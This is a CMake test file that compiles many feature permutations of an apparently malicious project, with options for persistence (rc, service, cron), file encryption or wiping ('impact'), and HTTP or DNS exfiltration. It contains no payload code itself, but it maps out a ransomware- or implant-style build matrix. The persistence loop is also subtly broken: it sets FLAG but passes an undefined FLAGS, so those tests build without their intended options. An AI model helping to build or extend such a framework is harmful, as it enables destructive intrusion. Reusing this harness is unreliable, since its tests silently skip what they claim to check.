cmake_minimum_required(VERSION 3.14)

function(add_build_test NAME FLAGS)
    set(TEST_BUILD_DIR "${CMAKE_CURRENT_BINARY_DIR}/build_${NAME}")

    add_test(
        NAME "Build_${NAME}"
        COMMAND ${CMAKE_COMMAND}
            -E env
            ${CMAKE_COMMAND}
            -S "${CMAKE_SOURCE_DIR}"
            -B "${TEST_BUILD_DIR}"
            -G "${CMAKE_GENERATOR}"
            ${FLAGS}
            -DENABLE_TESTING=OFF
    )

    add_test(
        NAME "Compile_${NAME}"
        COMMAND ${CMAKE_COMMAND} --build "${TEST_BUILD_DIR}" -- -j2
    )

    set_tests_properties("Compile_${NAME}" PROPERTIES DEPENDS "Build_${NAME}")
endfunction()

# PERMUTATIONS
add_build_test("All_Features" "")

add_build_test("Minimal" "-DENABLE_DEBUG=OFF -DENABLE_PERSISTENCE=OFF -DENABLE_IMPACT=OFF -DENABLE_EXFIL=OFF")

foreach(RC IN ITEMS ON OFF)
    foreach(SVC IN ITEMS ON OFF)
        foreach(CRON IN ITEMS ON OFF)
            set(NAME "Persist_RC-${RC}_SVC-${SVC}_CRON-${CRON}")
            set(FLAG "-DENABLE_PERSISTENCE=ON -DPERSIST_RUNCONTROL=${RC} -DPERSIST_SERVICE=${SVC} -DPERSIST_CRON=${CRON}")
            add_build_test("${NAME}" "${FLAGS}")
        endforeach()
    endforeach()
endforeach()

foreach(ALGO IN ITEMS XOR AES CHACHA)
    add_build_test("Impact_Encrypt_${ALGO}" "-DENABLE_IMPACT=ON -DIMPACT_ENCRYPT=ON -DENCRYPTION_ALGO=${ALGO}")
endforeach()

add_build_test("Impact_Wipe" "-DENABLE_IMPACT=ON -DIMPACT_ENCRYPT=OFF -DIMPACT_WIPE=ON")

add_build_test("Exfil_HTTP" "-DENABLE_EXFIL=ON -DEXFIL_HTTP=ON -DEXFIL_DNS=OFF")
add_build_test("Exfil_DNS" "-DENABLE_EXFIL=ON -DEXFIL_HTTP=OFF -DEXFIL_DNS=ON")
